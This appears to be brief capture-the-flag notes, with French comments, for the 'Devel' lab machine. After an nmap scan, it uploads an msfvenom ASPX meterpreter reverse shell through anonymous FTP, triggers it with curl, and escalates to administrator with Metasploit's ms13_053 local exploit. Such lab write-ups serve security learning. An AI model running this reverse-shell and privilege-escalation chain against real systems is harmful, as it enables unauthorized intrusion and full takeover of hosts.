# Devel

```shell
nmap -sV -Pn 10.10.10.5 -A -T5
	21/tcp open  ftp     Microsoft ftpd
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| 03-18-17  01:06AM       <DIR>          aspnet_client
	| 03-17-17  04:37PM                  689 iisstart.htm
	|_03-17-17  04:37PM               184946 welcome.png
	| ftp-syst: 
	|_  SYST: Windows_NT
	80/tcp open  http    Microsoft IIS httpd 7.5
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/7.5
	|_http-title: IIS7
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

	NSE: Script Post-scanning.

# acces anonymous sur ftp
# on peut upload file sur web root 
# on upload revshell aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f aspx >reverse.aspx
# on launch handler puis 
curl http://10.10.10.5/reverse.aspx
# on va privesc 
> run post/multi/recon/local_exploit_suggester
# on prend deuxieme exploit 
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set lhost tun0
lhost => 10.10.14.15
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set lport 1234
lport => 1234
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms13_053_schlamperei) >> run
# on est admin
```
